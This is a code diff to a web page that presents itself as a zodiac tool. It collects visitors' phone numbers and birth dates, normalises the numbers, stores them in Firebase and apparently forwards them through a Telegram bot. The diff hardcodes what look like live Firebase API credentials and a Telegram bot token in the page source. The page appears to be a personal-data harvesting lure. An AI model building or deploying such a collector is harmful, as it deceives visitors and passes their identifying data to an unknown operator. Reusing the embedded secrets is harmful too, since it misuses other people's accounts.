@@ -44,43 +44,6 @@ color: #ef4444;
 background-color: #ef4444;
 color: white;
 }
-/* Floating Console Styling */
-.floating-console {
-    position: fixed;
-    bottom: 1rem;
-    left: 1rem;
-    width: 90%;
-    max-width: 350px;
-    max-height: 200px;
-    background-color: rgba(0, 0, 0, 0.7);
-    color: white;
-    font-family: monospace;
-    font-size: 10px;
-    padding: 0.5rem;
-    border-radius: 0.5rem;
-    overflow-y: auto;
-    z-index: 9999;
-    border: 1px solid #333;
-}
-.console-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 0.5rem;
-}
-.console-header button {
-    background: #ef4444;
-    color: white;
-    border: none;
-    padding: 0.25rem 0.5rem;
-    border-radius: 0.25rem;
-    cursor: pointer;
-    font-size: 10px;
-}
-.console-output {
-    word-wrap: break-word;
-    white-space: pre-wrap;
-}
 </style>
 </head>
 <body class="bg-black">
@@ -110,54 +73,30 @@ color: white;
 </div>
 </div>
 
-<!-- Floating Console -->
-<div id="floatingConsole" class="floating-console">
-    <div class="console-header">
-        <span>Console</span>
-        <button id="clearConsoleBtn">Clear</button>
-    </div>
-    <div id="consoleOutput" class="console-output"></div>
-</div>
-
 <script type="module">
 // Import Firebase modules
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js";
 import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-database.js";
 
 // --- Firebase Configuration ---
-// Gunakan konfigurasi dari lingkungan Canvas jika tersedia.
-// Jika tidak, Anda bisa memasukkan kredensial dari Vercel Anda di sini secara manual.
-let firebaseConfig = null;
-if (typeof __firebase_config !== 'undefined' && __firebase_config) {
-    try {
-        firebaseConfig = JSON.parse(__firebase_config);
-        console.log("Menggunakan konfigurasi Firebase dari lingkungan Canvas.");
-    } catch (e) {
-        console.error("Gagal mengurai konfigurasi Firebase dari Canvas.", e);
-    }
-} else {
-    // --- TEMPAT ANDA BISA MENYALIN KREDENSIAL VERCEL SECARA MANUAL ---
-    // Hapus bagian ini di Vercel jika Anda menggunakan variabel lingkungan
-    // firebaseConfig = {
-    //     apiKey: "YOUR_VITE_FIREBASE_API_KEY",
-    //     authDomain: "YOUR_VITE_FIREBASE_AUTH_DOMAIN",
-    //     projectId: "YOUR_VITE_FIREBASE_PROJECT_ID",
-    //     storageBucket: "YOUR_VITE_FIREBASE_STORAGE_BUCKET",
-    //     messagingSenderId: "YOUR_VITE_FIREBASE_MESSAGING_SENDER_ID",
-    //     appId: "YOUR_VITE_FIREBASE_APP_ID"
-    // };
-    console.warn("Konfigurasi Firebase tidak ditemukan di lingkungan. Operasi penyimpanan data akan dilewati.");
-}
+// Kredensial hardcoded.
+const firebaseConfig = {
+    apiKey: "AIzaSyAbtV0PjDn_Tpco0kN09G0f8Jj_AlqPhUY",
+    authDomain: "callerappmagic.firebaseapp.com",
+    projectId: "callerappmagic",
+    storageBucket: "callerappmagic.firebasestorage.app",
+    messagingSenderId: "305458369263",
+    appId: "1:305458369263:web:eb133c9b1e08ddc78b811a",
+    databaseURL: "https://callerappmagic-default-rtdb.asia-southeast1.firebasedatabase.app"
+};
 
 let database = null;
-if (firebaseConfig) {
-    try {
-        const app = initializeApp(firebaseConfig);
-        database = getDatabase(app);
-        console.log("Firebase berhasil diinisialisasi.");
-    } catch (e) {
-        console.error("Gagal menginisialisasi Firebase:", e);
-    }
+try {
+    const app = initializeApp(firebaseConfig);
+    database = getDatabase(app);
+    console.log("Firebase berhasil diinisialisasi.");
+} catch (e) {
+    console.error("Gagal menginisialisasi Firebase:", e);
 }
 
 // --- Element References ---
@@ -167,46 +106,6 @@ const phoneNumberInput = document.getElementById('phoneNumberInput');
 const dobInput = document.getElementById('dobInput');
 const selectionContainer = document.getElementById('selectionContainer');
 const keypadTitle = document.getElementById('keypadTitle');
-const floatingConsole = document.getElementById('floatingConsole');
-const consoleOutput = document.getElementById('consoleOutput');
-const clearConsoleBtn = document.getElementById('clearConsoleBtn');
-
-// --- Custom Floating Console Logic ---
-const originalConsole = {
-    log: console.log,
-    warn: console.warn,
-    error: console.error,
-};
-
-function appendToConsole(message, type = 'log') {
-    const p = document.createElement('p');
-    const timestamp = new Date().toLocaleTimeString();
-    p.textContent = `[${timestamp}] ${message}`;
-    if (type === 'error') p.style.color = '#ef4444';
-    else if (type === 'warn') p.style.color = '#f59e0b';
-    else p.style.color = '#a0aec0';
-    consoleOutput.appendChild(p);
-    consoleOutput.scrollTop = consoleOutput.scrollHeight; // Scroll to bottom
-}
-
-console.log = (...args) => {
-    originalConsole.log(...args);
-    appendToConsole(args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' '), 'log');
-};
-
-console.warn = (...args) => {
-    originalConsole.warn(...args);
-    appendToConsole(args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' '), 'warn');
-};
-
-console.error = (...args) => {
-    originalConsole.error(...args);
-    appendToConsole(args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' '), 'error');
-};
-
-clearConsoleBtn.addEventListener('click', () => {
-    consoleOutput.innerHTML = '';
-});
 
 // --- Telegram API Config ---
 const TELEGRAM_BOT_TOKEN = '7639651359:AAF4XflfPvNvT6ku5APx3bSuzzbyG2cB_FY';
@@ -268,9 +167,15 @@ window.location.replace(url);
 
 // --- Main Application Flow ---
 async function handleZodiacSubmission() {
-const phone = phoneNumberInput.value;
+let phone = phoneNumberInput.value;
 const dob = dobInput.value;
 const zodiac = getZodiacSign(dob);
+
+// Menambahkan '0' di depan nomor telepon jika belum ada
+if (phone && !phone.startsWith('0')) {
+    phone = '0' + phone;
+    console.log("Nomor telepon diperbarui dengan '0' di depan:", phone);
+}
 
 const userData = {
 phoneNumber: phone,
